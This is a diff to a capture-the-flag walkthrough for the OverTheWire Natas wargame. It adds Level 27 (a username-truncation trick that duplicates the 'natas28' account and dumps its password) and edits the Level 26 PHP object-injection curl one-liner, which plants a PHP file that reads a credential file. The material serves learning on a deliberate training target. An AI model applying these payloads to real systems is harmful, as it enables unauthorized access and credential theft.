@@ -39,8 +39,10 @@ URL:      http://natas0.natas.labs.overthewire.org
 - [Level 21](#level-21)
 - [Level 22](#level-22)
 - [Level 23](#level-23)
-- [Level 24](#level-23)
-- [Level 25](#level-23)
+- [Level 24](#level-24)
+- [Level 25](#level-25)
+- [Level 26](#level-26)
+- [Level 27](#level-27)
 
 </details>
 
@@ -1817,6 +1819,192 @@ echo base64_encode(serialize(new Logger()));
 
 Now we pass that to the site and read the file:
 
-```php
+```bash
 filename=$(cat /dev/urandom | tr -cd [:alnum:] | head -c16); curl -s "http://natas26:$natas26_pass@natas26.natas.labs.overthewire.org/" -b drawing=$(php -r 'class Logger{private $exitMsg="<?php readfile('"'/etc/natas_webpass/natas27'"')?>";private $logFile="img/'$filename'.php";}echo urlencode(base64_encode(serialize(new Logger())));') -o /dev/null; curl -s "http://natas26:$natas26_pass@natas26.natas.labs.overthewire.org/img/$filename.php"
+```
+
+## Level 27
+
+![natas27_index.jpg](screenshots/natas/natas27_index.jpg)
+
+[Sourcecode](http://natas27.natas.labs.overthewire.org/index-source.html):
+
+```php
+<?
+
+// morla / 10111
+// database gets cleared every 5 min
+
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+
+function checkCredentials($link,$usr,$pass){
+
+    $user=mysql_real_escape_string($usr);
+    $password=mysql_real_escape_string($pass);
+
+    $query = "SELECT username from users where username='$user' and password='$password' ";
+    $res = mysql_query($query, $link);
+    if(mysql_num_rows($res) > 0){
+        return True;
+    }
+    return False;
+}
+
+
+function validUser($link,$usr){
+
+    $user=mysql_real_escape_string($usr);
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysql_query($query, $link);
+    if($res) {
+        if(mysql_num_rows($res) > 0) {
+            return True;
+        }
+    }
+    return False;
+}
+
+
+function dumpData($link,$usr){
+
+    $user=mysql_real_escape_string($usr);
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysql_query($query, $link);
+    if($res) {
+        if(mysql_num_rows($res) > 0) {
+            while ($row = mysql_fetch_assoc($res)) {
+                // thanks to Gobo for reporting this bug!
+                //return print_r($row);
+                return print_r($row,true);
+            }
+        }
+    }
+    return False;
+}
+
+
+function createUser($link, $usr, $pass){
+
+    $user=mysql_real_escape_string($usr);
+    $password=mysql_real_escape_string($pass);
+
+    $query = "INSERT INTO users (username,password) values ('$user','$password')";
+    $res = mysql_query($query, $link);
+    if(mysql_affected_rows() > 0){
+        return True;
+    }
+    return False;
+}
+
+
+if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas27', '<censored>');
+    mysql_select_db('natas27', $link);
+
+
+    if(validUser($link,$_REQUEST["username"])) {
+        //user exists, check creds
+        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
+            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
+            echo "Here is your data:<br>";
+            $data=dumpData($link,$_REQUEST["username"]);
+            print htmlentities($data);
+        }
+        else{
+            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
+        }
+    }
+    else {
+        //user doesn't exist
+        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
+            echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
+        }
+    }
+
+    mysql_close($link);
+} else {
+?>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password" type="password"><br>
+<input type="submit" value="login" />
+</form>
+<? } ?>
+```
+
+We have another SQL challenge. However, this time, it seems like every query uses [mysql_real_escape_string](https://www.php.net/manual/en/function.mysql-real-escape-string.php), which means SQLi is out of the question.
+
+While looking through the source code, one function jumps out at me:
+
+```php
+function dumpData($link,$usr){
+
+    $user=mysql_real_escape_string($usr);
+
+    $query = "SELECT * from users where username='$user'";
+    $res = mysql_query($query, $link);
+    if($res) {
+        if(mysql_num_rows($res) > 0) {
+            while ($row = mysql_fetch_assoc($res)) {
+                // thanks to Gobo for reporting this bug!
+                //return print_r($row);
+                return print_r($row,true);
+            }
+        }
+    }
+    return False;
+}
+```
+
+Obviously, this is the function we need to use to retreive the password. But how do we get this to print the password for `natas28`? Without SQLi, we are going to need valid user credentials. We don't have any way to change the password for `natas28`, and even if we could, that would be counterproductive. So the next logical option is to create a duplicate user for `natas28`. But is that even possible?
+
+If we take another look at the source code, we see this snippet:
+
+```sql
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+```
+
+I wonder what happens when we try to create a username longer than 64? Let's try making a user named `ReallyLongUsernameThatIsLongerThanTheMaximumCharacterLimitOfSixtyFour`.
+
+![natas27_1.jpg](screenshots/natas/natas27_1.jpg)
+
+Now let's try logging in to it.
+
+![natas27_2.jpg](screenshots/natas/natas27_2.jpg)
+
+Strange... But not unexpected. Let's think about why this happened. What most likely happened here is when we attempted to create the user `ReallyLongUsernameThatIsLongerThanTheMaximumCharacterLimitOfSixtyFour`, the name was truncated to 64 characters. When we attempted to log in with that user, the `validUser` function checks for the full name, whereas what's actually stored in the database is only the first 64 characters. This is why it creates another user with the same username. We can test this by attempting to log in with the user `ReallyLongUsernameThatIsLongerThanTheMaximumCharacterLimitOfSixt`, which is the first 64 characters of the username.
+
+![natas27_3.jpg](screenshots/natas/natas27_3.jpg)
+
+Success!
+
+If we take it one step further, we can repeat this process, but use different passwords for each instance. We should still be able to dump the user credentials for the first instance we created using the password from the second instance.
+
+Great. Now we've figured out how to create duplicate users, but how do we duplicate `natas28`? We can't just use filler characters to pad it... Or can we?
+
+Obviously, we won't be able to use some random character because `natas28` and `natas28AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` are two completely different usernames. But what if we use whitespace? Let's try creating a user with `natas28` and 58 or more spaces.
+
+![natas27_4.jpg](screenshots/natas/natas27_4.jpg)
+
+It's not what we wanted but it's progress. It looks like the two strings still match, despite having extra spaces. What if we add a non-whitespace character at the end?
+
+![natas27_5.jpg](screenshots/natas/natas27_5.jpg)
+
+It worked!
+
+```bash
+curl -s "http://natas27:$natas27_pass@natas27.natas.labs.overthewire.org/" --data-urlencode "username=natas28                                                         ." -d "password=password" >/dev/null; curl -s "http://natas27:$natas27_pass@natas27.natas.labs.overthewire.org/index.php?username=natas28&password=password" | sed "s/$natas27_pass//g" | egrep -o [[:alnum:]]{32}
 ```
